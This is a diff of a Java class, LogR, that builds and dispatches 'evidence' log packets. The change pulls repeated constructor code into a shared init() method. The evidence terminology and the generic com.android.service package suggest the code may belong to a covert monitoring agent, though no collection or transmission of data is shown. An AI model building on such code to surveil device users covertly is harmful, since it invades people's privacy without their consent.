@@ -21,10 +21,10 @@ import com.android.service.util.Utils;
 public class LogR {
 
 	/** The type. */
-	private final int type;
+	private int type;
 
 	/** The unique. */
-	private final long unique;
+	private long unique;
 
 	/** The disp. */
 	private LogDispatcher disp;
@@ -55,6 +55,18 @@ public class LogR {
 	/** The Constant LOG_PRI_MIN. */
 	final public static int LOG_PRI_MIN = 0xff;
 
+	private Packet init(final int evidence, final int priority) {
+		unique = Utils.getRandom();
+		disp = LogDispatcher.self();
+		type = evidence;
+	
+		final Packet p = new Packet(unique);
+	
+		p.setType(type);
+		p.setPriority(priority);
+		return p;
+	}
+
 	/**
 	 * Instantiates a new log, creates the evidence.
 	 * 
@@ -64,14 +76,7 @@ public class LogR {
 	 *            the priority
 	 */
 	public LogR(final int evidence, final int priority) {
-		unique = Utils.getRandom();
-		disp = LogDispatcher.self();
-		type = evidence;
-
-		final Packet p = new Packet(unique);
-
-		p.setType(type);
-		p.setPriority(priority);
+		final Packet p = init(evidence, priority);
 		p.setCommand(LOG_CREATE);
 
 		send(p);
@@ -88,14 +93,7 @@ public class LogR {
 	 *            the additional
 	 */
 	public LogR(final int evidenceType, final int priority, final byte[] additional) {
-		unique = Utils.getRandom();
-		disp = LogDispatcher.self();
-		type = evidenceType;
-
-		final Packet p = new Packet(unique);
-
-		p.setType(type);
-		p.setPriority(priority);
+		final Packet p = init(evidenceType, priority);
 		p.setCommand(LOG_CREATE);
 		p.setAdditional(additional);
 
@@ -116,14 +114,7 @@ public class LogR {
 	 *            the data
 	 */
 	public LogR(final int evidenceType, final int priority, final byte[] additional, final byte[] data) {
-		unique = Utils.getRandom();
-		disp = LogDispatcher.self();
-		type = evidenceType;
-
-		final Packet p = new Packet(unique);
-
-		p.setType(type);
-		p.setPriority(priority);
+		final Packet p = init(evidenceType, priority);
 		p.setCommand(LOG_ATOMIC);
 		p.setAdditional(additional);
 		p.fill(data);
